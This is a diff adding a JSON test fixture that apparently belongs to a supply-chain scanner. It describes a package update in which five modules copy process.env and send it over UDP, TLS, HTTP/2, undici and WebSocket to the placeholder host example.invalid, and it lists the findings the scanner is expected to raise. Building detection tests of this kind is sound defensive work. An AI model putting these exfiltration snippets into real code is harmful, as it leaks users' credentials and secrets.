@@ -1,0 +1,224 @@
+{
+  "id": "env-object-value-exfil",
+  "title": "Modified modules copy, wrap or hand on the whole environment and send it over non-HTTP channels",
+  "category": "credential-steal",
+  "intent": "Once process.env is a value (copied with Object.assign, spread, wrapped in URLSearchParams, passed to a helper, enumerated through a copy) no line regex can follow which variables leave with it, so every such use is credential access, and dgram, tls, http2, undici and ws are network egress. Each module pairs one shape with one channel and must stay high in a modified file. Safe: no values; hosts are example.invalid.",
+  "previousPackageJson": {
+    "name": "env-object-value-exfil",
+    "version": "1.0.0",
+    "main": "index.js"
+  },
+  "stagedPackageJson": {
+    "name": "env-object-value-exfil",
+    "version": "1.0.1",
+    "main": "index.js"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 69,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"env-object-value-exfil\",\"version\":\"1.0.0\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 138,
+      "sha256": "index-js",
+      "flags": [],
+      "textSample": "require('./lib/assign.js');\nrequire('./lib/spread.js');\nrequire('./lib/params.js');\nrequire('./lib/helper.js');\nrequire('./lib/each.js');\n"
+    },
+    {
+      "path": "lib/assign.js",
+      "size": 39,
+      "sha256": "lib/assign.js-before",
+      "flags": [],
+      "textSample": "module.exports = function report() {};\n"
+    },
+    {
+      "path": "lib/spread.js",
+      "size": 39,
+      "sha256": "lib/spread.js-before",
+      "flags": [],
+      "textSample": "module.exports = function report() {};\n"
+    },
+    {
+      "path": "lib/params.js",
+      "size": 39,
+      "sha256": "lib/params.js-before",
+      "flags": [],
+      "textSample": "module.exports = function report() {};\n"
+    },
+    {
+      "path": "lib/helper.js",
+      "size": 39,
+      "sha256": "lib/helper.js-before",
+      "flags": [],
+      "textSample": "module.exports = function report() {};\n"
+    },
+    {
+      "path": "lib/each.js",
+      "size": 39,
+      "sha256": "lib/each.js-before",
+      "flags": [],
+      "textSample": "module.exports = function report() {};\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 69,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"env-object-value-exfil\",\"version\":\"1.0.1\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 138,
+      "sha256": "index-js",
+      "flags": [],
+      "textSample": "require('./lib/assign.js');\nrequire('./lib/spread.js');\nrequire('./lib/params.js');\nrequire('./lib/helper.js');\nrequire('./lib/each.js');\n"
+    },
+    {
+      "path": "lib/assign.js",
+      "size": 230,
+      "sha256": "lib/assign.js-after",
+      "flags": [],
+      "textSample": "const dgram = require('node:dgram');\nconst copy = Object.assign({}, process.env);\nmodule.exports = function report() {\n  const s = dgram.createSocket('udp4');\n  s.send(Buffer.from(JSON.stringify(copy)), 53, 'example.invalid');\n};\n"
+    },
+    {
+      "path": "lib/spread.js",
+      "size": 203,
+      "sha256": "lib/spread.js-after",
+      "flags": [],
+      "textSample": "const tls = require('tls');\nconst snapshot = { ...process.env };\nmodule.exports = function report() {\n  const socket = tls.connect(443, 'example.invalid', () => socket.end(JSON.stringify(snapshot)));\n};\n"
+    },
+    {
+      "path": "lib/params.js",
+      "size": 217,
+      "sha256": "lib/params.js-after",
+      "flags": [],
+      "textSample": "const http2 = require('http2');\nmodule.exports = function report() {\n  const body = new URLSearchParams(process.env).toString();\n  http2.connect('https://example.invalid').request({ ':method': 'POST' }).end(body);\n};\n"
+    },
+    {
+      "path": "lib/helper.js",
+      "size": 246,
+      "sha256": "lib/helper.js-after",
+      "flags": [],
+      "textSample": "import { request } from 'undici';\nfunction pack(source) {\n  return Buffer.from(JSON.stringify(source)).toString('base64');\n}\nexport function report() {\n  return request('https://example.invalid/h', { method: 'POST', body: pack(process.env) });\n}\n"
+    },
+    {
+      "path": "lib/each.js",
+      "size": 261,
+      "sha256": "lib/each.js-after",
+      "flags": [],
+      "textSample": "const WebSocket = require('ws');\nconst copy = Object.assign({}, process.env);\nmodule.exports = function report() {\n  const ws = new WebSocket('wss://example.invalid');\n  ws.on('open', () => {\n    for (const key in copy) ws.send(key + '=' + copy[key]);\n  });\n};\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedReleaseRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/assign.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/assign.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/spread.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/spread.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/params.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/params.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/helper.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/helper.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/each.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/each.js"
+    }
+  ],
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/assign.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/assign.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/spread.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/spread.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/params.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/params.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/helper.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/helper.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/each.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/each.js"
+    }
+  ]
+}
